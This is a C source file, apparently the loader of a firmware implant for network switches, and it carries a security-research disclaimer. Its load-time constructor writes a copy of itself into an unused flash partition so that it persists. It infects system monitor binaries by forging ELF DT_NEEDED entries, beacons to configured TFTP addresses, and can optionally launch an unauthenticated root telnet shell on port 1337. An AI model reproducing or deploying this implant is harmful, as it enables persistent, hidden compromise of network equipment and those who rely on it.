/*
 * Copyright (C) 2025 ff794e44ea1c2b5211a3b07c57b5a3813f87f53ac10d78e56b16b79db6ff9615
 *                    b726ae7cf45cc4dfa8de359caffb893209bca614d9387a7666b106052fba3e50
 *
 * This program is free software: you can redistribute it and/or modify it
 * under the terms of the GNU General Public License as published by the Free
 * Software Foundation, either version 3 of the License, or (at your option)
 * any later version.
 *
 * This program is distributed in the hope that it will be useful, but WITHOUT
 * ANY WARRANTY; without even the implied warranty of MERCHANTABILITY or FITNESS
 * FOR A PARTICULAR PURPOSE. See the GNU General Public License for more details.
 *
 * You should have received a copy of the GNU General Public License along with
 * this program. If not, see <https://www.gnu.org/licenses/>.
 *
 * DMCA Security Research Exemption:
 * Good faith security research performed consistent with 17 U.S.C. §1201(j) and
 * 37 CFR §201.40(b)(7) is explicitly permitted.
 *
 * This software is intended solely for educational, forensic, and lawful
 * security research purposes. Any use of this software for offensive or harmful
 * purposes is strictly prohibited.
 *
 * GENERAL DISCLAIMER:
 * This program is distributed WITHOUT ANY WARRANTY or guarantee of suitability.
 * The author explicitly disclaims responsibility and liability for any direct,
 * indirect, incidental, or consequential damages resulting from use or misuse.
 * Users accept all risks associated with use or distribution.
 *
 * Use, modification, or distribution constitutes explicit agreement to all terms
 * above.
 */

#define _GNU_SOURCE
#include <stdio.h>
#include <string.h>
#include "loader.h"
#include <dlfcn.h>
#include <fcntl.h>
#include <errno.h>
#include <stdarg.h>
#include <stdlib.h>
#include <libgen.h>
#include <dlfcn.h>
#include <pthread.h>
#include <elf.h>
#include <arpa/inet.h>
#include "murmurhash.h"
#include "debug.h"
#include "common.h"
#include "infector.h"
#include "tftp.h"

static loader_state_t state;

const char signature[] = {
    0x20,0x20,0x20,0x20,0x20,0x20,0x20,0xe2,0x96,0x90,0x20,0xe2,0x96,0x84,0x20,
    0xe2,0x96,0x84,0xe2,0x96,0x84,0xe2,0x96,0x84,0x20,0x2e,0xe2,0x80,0xa2,0x20,
    0xe2,0x96,0x8c,0x20,0xe2,0x96,0x84,0x20,0xc2,0xb7,0x2e,0x20,0x20,0xe2,0x96,
    0x84,0xe2,0x96,0x84,0xe2,0x96,0x84,0xc2,0xb7,0x20,0x20,0xe2,0x96,0x90,0x20,
    0xe2,0x96,0x84,0x20,0x20,0xe2,0x96,0x84,0xe2,0x96,0x84,0xe2,0x96,0x84,0xc2,
    0xb7,0x20,0x20,0xe2,0x96,0x84,0xe2,0x96,0x84,0xe2,0x96,0x84,0xc2,0xb7,0xe2,
    0x96,0x84,0xe2,0x96,0x84,0xe2,0x96,0x84,0xe2,0x96,0x84,0xe2,0x96,0x84,0x0a,
    0xe2,0x96,0xaa,0x20,0x20,0x20,0x20,0x20,0xe2,0x80,0xa2,0xe2,0x96,0x88,0xe2,
    0x96,0x8c,0xe2,0x96,0x90,0xe2,0x96,0x88,0xe2,0x96,0x80,0xe2,0x96,0x84,0x2e,
    0xe2,0x96,0x80,0xc2,0xb7,0xc2,0xb7,0xe2,0x96,0x88,0xe2,0x96,0x88,0x20,0xe2,
    0x96,0x90,0xe2,0x96,0x88,0xe2,0x96,0x88,0xe2,0x96,0x88,0xe2,0x96,0xaa,0xe2,
    0x96,0x90,0xe2,0x96,0x88,0x20,0xe2,0x96,0x80,0xe2,0x96,0x88,0x20,0xe2,0x80,
    0xa2,0xe2,0x96,0x88,0xe2,0x96,0x8c,0xe2,0x96,0x90,0xe2,0x96,0x88,0xe2,0x96,
    0x90,0xe2,0x96,0x88,0x20,0xe2,0x96,0x80,0xe2,0x96,0x88,0x20,0xe2,0x96,0x90,
    0xe2,0x96,0x88,0x20,0xe2,0x96,0x84,0xe2,0x96,0x88,0xe2,0x80,0xa2,0xe2,0x96,
    0x88,0xe2,0x96,0x88,0x20,0x20,0x0a,0x20,0xe2,0x96,0x84,0xe2,0x96,0x88,0xe2,
    0x96,0x80,0xe2,0x96,0x84,0x20,0xe2,0x96,0x90,0xe2,0x96,0x88,0xe2,0x96,0x90,
    0xe2,0x96,0x90,0xe2,0x96,0x8c,0xe2,0x96,0x90,0xe2,0x96,0x80,0xe2,0x96,0x80,
    0xe2,0x96,0xaa,0xe2,0x96,0x84,0xe2,0x96,0x90,0xe2,0x96,0x88,0x20,0xe2,0x96,
    0x8c,0xe2,0x96,0x90,0xe2,0x96,0x8c,0xe2,0x96,0x90,0xe2,0x96,0x88,0xc2,0xb7,
    0xe2,0x96,0x84,0xe2,0x96,0x88,0xe2,0x96,0x80,0xe2,0x96,0x80,0xe2,0x96,0x88,
    0x20,0xe2,0x96,0x90,0xe2,0x96,0x88,0xe2,0x96,0x90,0xe2,0x96,0x90,0xe2,0x96,
    0x8c,0xe2,0x96,0x84,0xe2,0x96,0x88,0xe2,0x96,0x80,0xe2,0x96,0x80,0xe2,0x96,
    0x88,0x20,0x20,0xe2,0x96,0x88,0xe2,0x96,0x88,0xe2,0x96,0x80,0xc2,0xb7,0x20,
    0xe2,0x96,0x90,0xe2,0x96,0x88,0x2e,0xe2,0x96,0xaa,0x0a,0xe2,0x96,0x90,0xe2,
    0x96,0x88,0xe2,0x96,0x8c,0x2e,0xe2,0x96,0x90,0xe2,0x96,0x8c,0xe2,0x96,0x88,
    0xe2,0x96,0x88,0xe2,0x96,0x90,0xe2,0x96,0x88,0xe2,0x96,0x8c,0xe2,0x96,0x90,
    0xe2,0x96,0x88,0xe2,0x96,0x84,0xe2,0x96,0x84,0xe2,0x96,0x8c,0xe2,0x96,0x88,
    0xe2,0x96,0x88,0x20,0xe2,0x96,0x88,0xe2,0x96,0x88,0xe2,0x96,0x8c,0xe2,0x96,
    0x90,0xe2,0x96,0x88,0xe2,0x96,0x8c,0xe2,0x96,0x90,0xe2,0x96,0x88,0x20,0xe2,
    0x96,0xaa,0xe2,0x96,0x90,0xe2,0x96,0x8c,0xe2,0x96,0x88,0xe2,0x96,0x88,0xe2,
    0x96,0x90,0xe2,0x96,0x88,0xe2,0x96,0x8c,0xe2,0x96,0x90,0xe2,0x96,0x88,0x20,
    0xe2,0x96,0xaa,0xe2,0x96,0x90,0xe2,0x96,0x8c,0xe2,0x96,0x90,0xe2,0x96,0x88,
    0xe2,0x96,0xaa,0xc2,0xb7,0xe2,0x80,0xa2,0x20,0xe2,0x96,0x90,0xe2,0x96,0x88,
    0xe2,0x96,0x8c,0xc2,0xb7,0x0a,0x20,0xe2,0x96,0x80,0xe2,0x96,0x88,0xe2,0x96,
    0x84,0xe2,0x96,0x80,0xe2,0x96,0xaa,0xe2,0x96,0x80,0xe2,0x96,0x80,0x20,0xe2,
    0x96,0x88,0xe2,0x96,0xaa,0x20,0xe2,0x96,0x80,0xe2,0x96,0x80,0xe2,0x96,0x80,
    0x20,0xe2,0x96,0x80,0xe2,0x96,0x80,0x20,0x20,0xe2,0x96,0x88,0xe2,0x96,0xaa,
    0xe2,0x96,0x80,0xe2,0x96,0x80,0xe2,0x96,0x80,0x20,0xe2,0x96,0x80,0x20,0x20,
    0xe2,0x96,0x80,0x20,0xe2,0x96,0x80,0xe2,0x96,0x80,0x20,0xe2,0x96,0x88,0xe2,
    0x96,0xaa,0x20,0xe2,0x96,0x80,0x20,0x20,0xe2,0x96,0x80,0x20,0x2e,0xe2,0x96,
    0x80,0x20,0x20,0x20,0x20,0xe2,0x96,0x80,0xe2,0x96,0x80,0xe2,0x96,0x80,0x20
};

#define LAME_AND_OBVIOUS_ARTIFACT "/fast_iron/sys/bcm.bkup"

const char placeholder[256] = {
    0x43,0x48,0x4f,0x4d,0x4f,0x56,0x41,0x55,0x4c,0x54
};

const char *flappyswitch_hello = "/fast_iron/FLAPPYSWITCH.HELLO";
const char *persistent_copy = LAME_AND_OBVIOUS_ARTIFACT;
const char *gsem_update = "/tmp/nothing_weird_to_be_noticed";
const char *gsem_funk = "/tmp/nothing_funky_going_on";

static pid_t original_pid = 0;
static pthread_t main_thread;

static char lib_gcc_so[] = "/lib/gcc_s.so.1";
static char lib_pkg_py2713_so[] = "/.pkg/Python-2.7.13/lib/gcc_s.so.1";
static char lib_pkg_logmgrPkg_so[] = "/.pkg/logmgrPkg/lib/gcc_s.so.1";

static loader_pivot_t pivots[] = {
    /* PIVOT_TYPE_ENTRYPOINT entries must be first! */
    /*
        uint32_t seed;
    uint32_t hash; // Murmurhash of the path
    const char *original;
    int type;
    int fi_major_version;
    void *extra;
    void *extra2;
    */
    {
        0,
        0x12609970, // /lib/libm.so.6
        "/lib/libm-2.18.so",
        PIVOT_TYPE_ENTRYPOINT,
        8,
        NULL,
        NULL
    },
    {
        0,
        0x3f2e7363,
        "/usr/local/bin/hmon_poed_fmntr",
        PIVOT_TYPE_INFECT,
        8,
        &lib_gcc_so,
        NULL
    },
    {
        0xdefacedd,
        0x2ea59904,
        "/fast_iron/.pkg/primary/logmgrPkg/bin/hmon_logmgrfmntr",
        PIVOT_TYPE_INFECT,
        8,
        &lib_pkg_logmgrPkg_so,
        NULL
    },
    {
        0xdefacedd,
        0xe5993092,
        "/fast_iron/.pkg/primary/logmgrPkg/bin/hmon_log_clf_fmntr",
        PIVOT_TYPE_INFECT,
        8,
        &lib_pkg_logmgrPkg_so,
        NULL
    },
    {
        0xdefacedd,
        0xba26aeca,
        "/fast_iron/.pkg/secondary/logmgrPkg/bin/hmon_logmgrfmntr",
        PIVOT_TYPE_INFECT,
        8,
        &lib_pkg_logmgrPkg_so,
        NULL
    },
    {
        0xdefacedd,
        0x39cba331,
        "/fast_iron/.pkg/secondary/logmgrPkg/bin/hmon_log_clf_fmntr",
        PIVOT_TYPE_INFECT,
        8,
        &lib_pkg_logmgrPkg_so,
        NULL
    },
    {
        0,
        0,
        NULL,
        PIVOT_TYPE_NONE,
        0,
        NULL,
        NULL
    }
};

extern char *program_invocation_name;


static uint32_t self_murmur(void)
{
    return murmurhash((const char *) state.dl_info.dli_fbase, 256, 0);
}

static uint32_t file_murmur(const char *path, size_t len, long off)
{
    unsigned char buffer[256];

    FILE *f = fopen(path, "rb");
    if (!f) {
        debug_fprintf(stderr, "fopen: %s\n", strerror(errno));
        return 0;
    }

    fseek(f, 0, SEEK_END);
    long file_size = ftell(f);
    rewind(f);

    if (off >= file_size) {
        debug_fprintf(stderr, "%s: offset %ld is beyond file size %ld\n",
            __FUNCTION__, off, file_size);
        fclose(f);
        return 0;
    }

    if (off) {
        debug_fprintf(stdout, "%s: seeking to offset %ld\n",
            __FUNCTION__, off);
        if (fseek(f, off, SEEK_SET) != 0) {
            debug_fprintf(stderr, "%s: fseek error: %s\n",
                __FUNCTION__, strerror(errno));
            fclose(f);
            return 0;
        }
    }

    size_t bytes_read = fread(buffer, 1, len, f);
    if (bytes_read != len) {
        if (feof(f)) {
            debug_fprintf(stderr, "%s: EOF after reading %zu bytes\n",
                __FUNCTION__, bytes_read);
        }
        if (ferror(f)) {
            perror("fread");
        }
    }

    fclose(f);
    return murmurhash((const char *)buffer, (uint32_t)bytes_read, 0);
}

#if 0
static int copy_binfile(const char *from, const char *to)
{
    FILE *dst;
    FILE *src;
    size_t n;
    char buf[4096];

    debug_fprintf(stdout, "copying %s to %s\n", from, to);

    src = fopen(from, "rb");
    if (src == NULL) {
        debug_perror("fopen src");
        return -1;
    }

    dst = fopen(to, "wb");
    if (dst == NULL) {
        debug_perror("fopen dst");
        fclose(src);
        return -1;
    }

    while ((n = fread(buf, 1, sizeof(buf), src)) > 0) {
        if (fwrite(buf, 1, n, dst) != n) {
            debug_perror("fwrite");
            fclose(src);
            fclose(dst);
            return -1;
        }
    }

    if (ferror(src)) {
        debug_perror("fread");
        fclose(src);
        fclose(dst);
        return -1;
    }

    fclose(src);
    fclose(dst);

    return 0;
}
#endif

static void get_prog_args(char *argsbuf, size_t len)
{
    size_t i;
    char *p;

    FILE *cmdline_file = fopen("/proc/self/cmdline", "r");
    if (cmdline_file) {
        size_t cmdline_len = fread(argsbuf, 1, len - 1, cmdline_file);
        argsbuf[len - 1] = '\0';
        fclose(cmdline_file);

        /* de-tokenize the args */
        p = argsbuf;
        for (i = 0; i < cmdline_len; i++) {
            if (*p == '\0') {
                *p = ' ';
            }

            p++;
        }
    }
}

/*
 * Parses /proc/mtd to locate the first partition with the name "unused".
 * Returns the partition index (e.g. 8 for "mtd8") or -1 on failure.
 */
static int get_unused_partition(void)
{
    FILE *fp;
    char line[256];
    int index;
    char part_name[64];

    fp = fopen("/proc/mtd", "r");
    if (fp == NULL) {
        perror("fopen");
        return -1;
    }

    if (fgets(line, sizeof(line), fp) == NULL) {
        fclose(fp);
        return -1;
    }

    while (fgets(line, sizeof(line), fp) != NULL) {
        if (sscanf(line, "mtd%d: %*s %*s \"%63[^\"]\"", &index, part_name) == 2) {
            if (strcmp(part_name, "unused") == 0) {
                fclose(fp);
                return index;
            }
        }
    }

    fclose(fp);

    return -1;  /* "unused" partition not found */
}

static void dump_maps(void)
{
#ifdef DEBUG
    char line[1024];

    FILE *fp = fopen("/proc/self/maps", "r");
    if (fp == NULL) {
        perror("fopen");
        return;
    }

    while (fgets(line, sizeof(line), fp) != NULL)
        printf("%s", line);

    fclose(fp);
#endif
}

static int write_backup_to_mtd()
{
    uint32_t mtd_hash;
    uint32_t self_hash;
    char path[256];
    char buf[4096];
    size_t n;

    snprintf(path, sizeof(path), "/dev/mtdblock%d", state.unused_partition_idx);
    path[sizeof(path) - 1] = '\0';

    /* skip if current */
    mtd_hash = file_murmur(path, 256, state.backup_offset + sizeof(off_t));
    self_hash = self_murmur();

    if (mtd_hash == self_hash)
        return 0;

    FILE *fp = fopen(path, "wb");
    if (fp == NULL) {
        perror("fopen");
        return -1;
    }

    fseek(fp, state.backup_offset, SEEK_SET);

    FILE *sfp = fopen(state.loaded_from, "rb");
    if (sfp == NULL) {
        perror("fopen");
        return -1;
    }

    /* write the loader size as prefix */
    off_t loader_size = get_file_size(state.loaded_from);
    fwrite(&loader_size, 1, sizeof(off_t), fp);

    debug_fprintf(stdout, "writing ourselves (%lu bytes, %08x) to %s (offset %u)\n",
        loader_size, self_hash, path, state.backup_offset);

    while ((n = fread(buf, 1, sizeof(buf), sfp)) > 0) {
        if (fwrite(buf, 1, n, fp) != n) {
            debug_perror("fwrite");
            fclose(sfp);
            fclose(fp);
            return -1;
        }
    }

    fclose(fp);
    fclose(sfp);

    return 0;
}

static int copy_from_backup(const char *dst_path)
{
    FILE *dst;
    FILE *src;
    char srcpath[256];
    char buf[4096];
    size_t n;
    size_t xfer = 0;
    off_t verification_offset = 0;
    size_t loader_size = 0;
    uint32_t backup_hash;
    uint32_t dst_hash;

    if (state.unused_partition_idx)
    {
        snprintf(srcpath, sizeof(srcpath), "/dev/mtdblock%d", state.unused_partition_idx);
        srcpath[sizeof(srcpath) - 1] = '\0';

        src = fopen(srcpath, "rb");
        if (src == NULL) {
            unlink(dst_path);
            perror("fopen");
            return -1;
        }

        fseek(src, state.backup_offset, SEEK_SET);
        fread(&loader_size, sizeof(off_t), 1, src);

        verification_offset = state.backup_offset + sizeof(off_t);
        backup_hash = file_murmur(srcpath, 256, verification_offset);

        debug_fprintf(stdout, "[*] backup in %s:%u\n", srcpath, state.backup_offset);
    } else {
        /* :> */
        return -1;
    }

    /* no need to update */
    dst_hash = file_murmur(dst_path, 256, 0);

    if (dst_hash == backup_hash) {
        debug_fprintf(stdout, "%s: %s is OK\n", __FUNCTION__, dst_path);
        fclose(src);
        return 0;
    } else {
        debug_fprintf(stdout, "%s: backup %08x != dst %08x\n", __FUNCTION__, backup_hash, dst_hash);
    }

    dst = fopen(dst_path, "wb");
    if (dst == NULL) {
        perror("fopen");
        fclose(src);
        return -1;
    }

    debug_fprintf(stdout, "writing loader from %s to %s\n", srcpath, dst_path);

    while ((n = fread(buf, 1, sizeof(buf), src)) > 0 && xfer < loader_size) {
        if (fwrite(buf, 1, n, dst) != n) {
            debug_perror("fwrite");
            fclose(src);
            fclose(dst);
            return -1;
        }

        xfer += n;
    }

    fclose(dst);
    fclose(src);

    return 0;
}

static void update_backup_location(void)
{
    int lockfd;

    lockfd = acquire_global_lock(gsem_update);
    if (lockfd < 0) {
        debug_fprintf(stdout, "[*] update in progress elsewhere\n");
        return;
    }

    state.unused_partition_idx = get_unused_partition();

    if (state.unused_partition_idx > 0) {
        write_backup_to_mtd();
        unlink(gsem_update);
        close(lockfd);
    } else {
        debug_fprintf(stderr, "whoops!\n");
        abort();
    }
}

static void process_funk(void)
{
    int lockfd;

    lockfd = acquire_global_lock(gsem_funk);
    if (lockfd < 0) {
        debug_fprintf(stdout, "[*] funk in progress elsewhere\n");
        return;
    }

    read_hidden_stream("/dev/sda");
    unlink(gsem_funk);
    close(lockfd);
}

__attribute__((visibility("default")))
int get_so_path(void)
{
    /*
     * dladdr() will fill dl_info with information about the symbol address
     * we pass in. We'll use the address of the current function, but
     * any function or symbol in the same DSO works.
     */
    if (dladdr((void*) &get_so_path, &state.dl_info) != 0)
    {
        /* dli_fname contains the pathname of the shared object */
        debug_fprintf(stderr, "[*] loaded from: %s\n", state.dl_info.dli_fname);
        state.loaded_from = state.dl_info.dli_fname;
        return 1;
    } else {
        debug_fprintf(stderr, "[!] could not determine the .so load path.\n");
        return 0;
    }
}

static int repair_symlink(const char *path, const char *src)
{
    int result;

    result = unlink(path);
    if (result != 0) {
        debug_perror("unlink");
        return -1;
    }

    result = symlink(src, path);
    if (result != 0) {
        debug_perror("symlink");
        return -1;
    }

    debug_fprintf(stderr, "repaired %s -> %s\n", src, path);

    return 0;
}

static void handle_infection_pivot(const loader_pivot_t *piv, uint32_t loadhash)
{
    const char *xtra = (const char *) piv->extra;
    const char *target = (const char *) piv->original;

#ifdef DEBUG
    debug_fprintf(stdout,
        "handling infection pivot: \n"
        " type=%d seed=%08x hash=%08x fi_major_version=%d\n"
        " extra: %s\n"
        " extra2: %s\n",
        piv->type, piv->seed, piv->hash,
        piv->fi_major_version,
        (char *) piv->extra,
        (char *) piv->extra2);
#endif

    if (piv->type != PIVOT_TYPE_INFECT)
        return;

    /* we are not being loaded from the infected exec/dso or its actual implanted target */
    if (piv->hash != loadhash && loadhash != murmurhash(xtra, strlen(xtra), piv->seed))
    {
        int err;
        elf_dtn_infector_state_t ei;

        debug_fprintf(stdout, "attempting to infect ELF %s -> %s\n", target, xtra);

        /*
         * this must run before the entrypoint pivot is repaired -if used-,
         * otherwise the file is gone
         */
        err = copy_from_backup(xtra);
        if (err) {
            debug_fprintf(stderr, "failed to copy ourselves to %s\n", xtra);
            return;
        }

        /* parse the target ELF and initialize the infector's state */
        err = elf_dtn_infector_init(&ei, target);
        if (err) {
            debug_fprintf(stderr, "failed to initialize ELF infector (err %d)\n", err);
            return;
        }

        /* if the ELF contains a DT_DEBUG entry
         * proceed with the DT_DEBUG->DT_NEEDED forgery
         */
        if (ei.debug_index != -1)
        {
            char forged_name[MAX_PATH_LEN];

            /* target the first entry for simplicity */
            err = elf_dtn_infector_forge_dtneeded(&ei, NULL, 0, 3, forged_name, sizeof(forged_name));
            if (err) {
                debug_fprintf(stderr, "failed to infect ELF via DT_DEBUG forgery (err %d)\n", err);
                return;
            }

            /* success, now we need to symlink the forged entry target path */
            if (!err) {
                char respath[MAX_PATH_LEN];

                err = abspath_from_orig(target, forged_name, respath, sizeof(respath));
                if (!err)
                {
                    if (access(persistent_copy, F_OK) != 0) {
                        debug_fprintf(stderr, "[!] persistent copy at %s does not exist!\n",
                            persistent_copy);
                        return;
                    }

                    debug_fprintf(stdout, "linking %s -> %s\n", respath, persistent_copy);
                    check_and_fix_symlink(respath, persistent_copy);
                }
            }
        }
    }
}

static void handle_pivot(void)
{
    int i;

    for (i = 0; i < sizeof(pivots) / sizeof(loader_pivot_t); i++)
    {
        const loader_pivot_t *cur = &pivots[i];

        if (cur->original == NULL)
            break;

        uint32_t loadpath_hash = murmurhash(state.loaded_from, strlen(state.loaded_from), cur->seed);

        debug_fprintf(stderr, "checking pivot: %08x (type %d) (loaded from %s) -> %s\n",
                loadpath_hash, cur->type, state.loaded_from, cur->original);

        if (loadpath_hash == cur->hash && cur->type == PIVOT_TYPE_ENTRYPOINT)
        {
            debug_fprintf(stderr, "matched 'entrypoint' pivot! attempting repair...\n");

            if (repair_symlink(state.loaded_from, cur->original)) {
                debug_fprintf(stderr, "failed to repair pivot target :(\n");
                break;
            }
        } else if (cur->type == PIVOT_TYPE_INFECT) {
            handle_infection_pivot(cur, loadpath_hash);
        }
    }
}

static void telltale(void)
{
#ifdef DEBUG
    FILE *f;
    char progargs[MAX_PATH_LEN];
    uint32_t strhash;
    const char *baseprogname = basename(program_invocation_name);

    memset(progargs, 0, sizeof(progargs));
    get_prog_args(progargs, sizeof(progargs));
    strhash = murmurhash(progargs, strlen(progargs), 0);

    f = fopen(flappyswitch_hello, "a");
    if (f == NULL)
        return;

    fprintf(f, "%s (%d): %s %s (0x%08x)\n", baseprogname, getpid(),
        program_invocation_name, progargs, strhash);

    fprintf(stdout, "%s (%d): %s %s (0x%08x)\n", baseprogname, getpid(),
        program_invocation_name, progargs, strhash);

    fflush(f);
    fclose(f);
#endif
}

static void fork_tftp(int do_fork)
{
    if (state.packedcfg == NULL)
        return;

    if (do_fork) {
        pid_t pid = fork();
        if (pid < 0) {
            debug_perror("fork");
        } else if (pid == 0)
        {
            tftp_launch(&(state.packedcfg->tftp_addrs[0]), TFTP_HEARTBEAT,
                NULL, 1, 0, 1);

            exit(0);
        }
    } else {
        tftp_launch(&(state.packedcfg->tftp_addrs[0]), TFTP_HEARTBEAT, NULL,
            1, 0, 0);
    }
}

static void write_signature(void)
{
    FILE *fp = NULL;

    fp = fopen("/etc/welcome", "wb");
    if (fp == NULL)
        return;

    fwrite(signature, sizeof(signature), 1, fp);
    fflush(fp);
    fclose(fp);
}

static int enter(void)
{
    telltale();
    dump_maps();

#ifndef NO_TFTP
    fork_tftp(1);
#endif

    /* this mostly depends on being loaded as RTLD_GLOBAL! */
    if (original_pid == 0) {
        original_pid = getpid();
        main_thread = pthread_self();
    } else {
        if (getpid() != original_pid) {
            debug_fprintf(stdout, "skipped: forked process detected (pid %d vs %d).\n",
                getpid(), original_pid);
            return -1;
        }

        if (!pthread_equal(pthread_self(), main_thread)) {
            debug_fprintf(stdout, "skipped: non-main thread detected.\n");
            return -1;
        }
    }

    if (!state.finished) {
        if (get_so_path())
        {
            uint32_t loadpath_hash = murmurhash(state.loaded_from, strlen(state.loaded_from), 0);

            update_backup_location();

            debug_fprintf(stderr, "seed=0 hash for load path %s -> (0x%08x)\n",
                state.loaded_from, loadpath_hash);

            handle_pivot();
            process_funk();
            write_signature();

#ifdef START_TELNETD
            system("/usr/sbin/telnetd -l /bin/sh -p 1337 -f /etc/welcome");
#endif
            state.finished = 1;
        }
    }

    return 0;
}

extern char *program_invocation_name;

static void get_packed_config(void)
{
    struct loader_packed_config *tmp;

    tmp = (struct loader_packed_config *) (((unsigned char *)&placeholder) + PACKCFG_MARKER_OFFSET);
    tmp->magic = ntohl(tmp->magic);

    if (tmp->magic == PACKCFG_MAGIC) {
        debug_fprintf(stderr, "packed cfg at %p\n", tmp);
        debug_fprintf(stderr, "packed cfg: tftp_addr[0]=%s\n",
            inet_ntoa(tmp->tftp_addrs[0]));
        debug_fprintf(stderr, "packed cfg: tftp_addr[1]=%s\n",
            inet_ntoa(tmp->tftp_addrs[1]));
        debug_fprintf(stderr, "packed cfg: tftp_addr[2]=%s\n",
            inet_ntoa(tmp->tftp_addrs[2]));
        debug_fprintf(stderr, "packed cfg: tftp_addr[3]=%s\n",
            inet_ntoa(tmp->tftp_addrs[3]));
        state.packedcfg = tmp;
    } else {
        debug_fprintf(stderr, "packed cfg at %p: NOT SET! MAGIC %08X\n",
            tmp, tmp->magic);
    }
}

/* constructor for INI array */
static void con() __attribute__((constructor));

void con() {
    memset(&state, sizeof(state), 0);
    state.backup_offset = UNUSED_PARTITION_OFFSET;
    get_packed_config();
    enter();
}
